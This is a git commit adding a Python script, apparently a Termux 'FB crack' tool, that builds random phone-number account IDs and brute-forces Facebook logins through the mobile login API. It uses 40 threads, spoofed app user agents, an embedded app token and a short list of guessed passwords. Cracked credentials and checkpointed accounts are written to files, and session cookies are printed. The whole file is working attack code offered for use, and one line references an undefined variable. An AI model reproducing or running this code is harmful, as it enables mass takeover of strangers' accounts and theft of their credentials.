c34beeb858f24b445a66d154ded01db0fc00e5c4
farhanmallik51 <164368504+farhanmallik51@users.noreply.github.com>
2024-03-24 23:31:52 +0600

    Add files via upload

---
+++ farhan.py
@@ -0,0 +1,172 @@
+# ═════════════════════════════════
+# Gift By Alhaj
+# ADMIN TG ID : @Alhaj_404
+# TG : https://t.me/fb_crack_termux_all_free_command
+# FB : https://facebook.com/groups/fb.crack.termux.all.free.command/
+# ═════════════════════════════════
+import os, sys
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+import os,sys,time,json,random,re,string,platform,base64,platform,uuid
+import requests,random,sys,json,os,re
+from time import sleep
+from os import system
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform 																																																																															#CR4ATE B4Y : A'l'h'a'j 4'0'4
+import marshal,zlib,base64
+from random import random as acak
+from random import choice as pilih
+from random import randint
+from bs4 import BeautifulSoup
+import requests as ress
+from sys import exit as exit
+id = []
+user = []
+oks = []
+cps = []
+loop = 0
+logo =("""
+\033[1;91m    ╔═════════════════════════╗
+\033[1;31m    ║
+\033[1;31m    ║ 
+\033[1;31m    ║  █▀▀ ▄▀█ █▀█ █░█ ▄▀█ █▄░█║
+\033[1;31m    ║  █▀░ █▀█ █▀▄ █▀█ █▀█ █░▀█║
+\033[1;31m    ║
+\033[1;91m    ╠═════════════════════════╣
+\033[1;91m    ║ \033[1;92m         \033[1;91m║
+\033[1;91m    ║ \033[1;92m      ᏙᎬᎡՏᏆϴΝ 8.0     \033[1;91m║
+\033[1;91m    ║\033[1;92m      ᎠᎪᎡᏦ-FARHAN-404     \033[1;91m║
+\033[1;91m    ╚═════════════════════════╝
+""") 
+ 
+def Alhaj():
+    os.system('clear')
+    os.system("xdg-open https://t.me/fb_crack_termux_all_free_command")
+    print(logo)
+    print("")
+    print("\033[1;96m ╔═════════════════════════════════╗")
+    print("\033[1;36m ║  \033[1;35m[\033[1;32m1\033[1;35m][\033[1;32mA\033[1;35m] \033[1;32m ᎡᎪΝᎠϴᎷ ᏟᏞϴΝᎬ ᏴᎠ        \033[1;36m║")
+    print("\033[1;96m ╠═════════════════════════════════╣")
+    print(" \033[1;36m║  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ ҒᏴ ᏀᎡϴႮᏢ       \033[1;36m║")
+    print(" \033[1;36m║  \033[1;35m[\033[1;32m3\033[1;35m][\033[1;32mC\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ MS ᏀᎡϴႮᏢ       \033[1;36m║")
+    print("\033[1;36m ║  \033[1;35m[\033[1;32m0\033[1;35m][\033[1;32mX\033[1;35m] \033[1;32m ᎬХᏆͲ                   \033[1;36m║")
+    print("\033[1;96m ╚═════════════════════════════════╝")
+    print("")
+    Alhaj = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
+    if Alhaj in ["1","A"]:
+        Alhajs()
+    if Alhaj in ["2","B"]:
+        os.system('xdg-open https://facebook.com/groups/fb.crack.termux.all.free.command/')
+    if Alhaj in ["3","C"]:
+        os.system('xdg-open https://m.me/j/AbZqgfeGR8AMRy9D/')
+    if Alhaj in ["0","X"]:
+        os.system('exit')
+
+def Alhajs():
+    user=[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print("\033[1;91m╔════════════════════════════════════════════╗")
+    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : \033[1;31m[\033[1;32m016\033[1;31m] [\033[1;32m017\033[1;31m] [\033[1;32m018\033[1;31m] [\033[1;32m019\033[1;31m] \033[1;31m  ║")
+    print("\033[1;91m╚════════════════════════════════════════════╝")
+    code = input('\033[1;32m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ :\033[1;36m ')
+    os.system('clear')
+    os.system('xdg-open https://facebook.com/groups/fb.crack.termux.all.free.command/')
+    print(logo)
+    print("\033[1;91m╔════════════════════════════════════════════╗")
+    print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m ║")
+    print("\033[1;91m╚════════════════════════════════════════════╝")
+    limit=int(input("\033[1;32m ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ :\033[1;36m "))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    with ThreadPool(max_workers=40) as Fb_crack:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
+        print("\033[1;91m╔═════════════════════════════╗")
+        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ : '+code) 
+        print(f'\033[1;91m║\033[1;92m ƳϴႮᎡ ͲϴͲᎪᏞ ᏆᎠ : '+tl)
+        print(f'\033[1;91m║\033[1;92m   ᏀᏆҒͲ ᏴƳ ᎪᏞᎻᎪᎫ ')
+        print("\033[1;91m╚═════════════════════════════╝")
+        for love in user:
+            uid = code+love
+            pwx = [love,love[2:],code+love[:4],love[3:],'FreeFire','Pubghaj123','Jannat','Sadiya']
+            Fb_crack.submit(Alhajm,uid,pwx,tl)
+    print("\033[1;91m╔═══════════════════════════╗")
+    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
+    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM ALHAJ ')
+    print("\033[1;91m╚═══════════════════════════╝")
+
+def Alhajm(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r \033[1;91m[\033[1;92mՏᎬᎪᎡᏟᎻᏆΝᏀ\033[1;91m]🤭[\033[1;92m%s\033[1;91m]😜[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.flush()
+            # ══════[ PAST UPDATE YOUR UA ]═══════ #
+            Ax1="[FBAN/FB4A;FBAV/547.0.0.38668;FBBV/196046158;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_IN;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N920S;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
+            Ax2="[FBAN/FB4A;FBAV/579.0.0.69140;FBBV/413070255;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
+            Ax3="[FBAN/FB4A;FBAV/710.0.0.12734;FBBV/559578301;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_IN;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G920F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
+            Ax4="[FBAN/FB4A;FBAV/906.0.0.12415;FBBV/578680325;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_BD;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T231;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
+            Ax5="[FBAN/FB4A;FBAV/906.0.0.12415;FBBV/578680325;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748058;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_BD;FBCR/TELCEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T561;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
+            android_version=str(random.randrange(8,13))
+            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            adid = str(uuid.uuid4())
+            data={'adid': str(uuid.uuid4()),
+            'format': 'json',
+            'device_id': str(uuid.uuid4()),
+            'email': uid,
+            'password': ps,
+            'generate_analytics_claims': '1',
+            'community_id': '',
+            'cpl': 'true',
+            'try_num': '1',
+            'family_device_id': str(uuid.uuid4()),
+            'credentials_type': 'password',
+            'source': 'login',
+            'error_detail_type': 'button_with_disabled',
+            'enroll_misauth': 'false',
+            'generate_session_cookies': '1',
+            'generate_machine_id': '1',
+            'currently_logged_in_userid': '0',
+            'locale': 'en_GB',
+            'client_country_code': 'GB',
+            'fb_api_req_friendly_name': 'authenticate'}
+            headax={'User-Agent': Ax5,
+            'Accept-Encoding':  'gzip, deflate',
+            'Accept': '*/*',
+            'Connection': 'keep-alive',
+            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'X-FB-Friendly-Name': 'authenticate',
+            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+            'X-FB-Connection-Type': 'unknown',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-FB-HTTP-Engine': 'Liger'}
+            xo = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=headax).json()
+            if 'session_key' in xo:
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                print(f'\033[1;96m[\033[1;92mҒᏴ-ᏟᎡᎪᏟᏦ-ϴᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m◉\033[1;92m '+ps+'')
+                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;35m'+coki)
+                open('/sdcard/ALHAJ-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'www.facebook.com' in xo['error']['message']:
+                print('\033[1;90m[ҒᏴ-ᏟᎡᎪᏟᏦ-ᏟᏢ] '+uid+' ◉ '+ps+' \n')
+                open('/sdcard/ALHAJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+ 
+Alhaj()
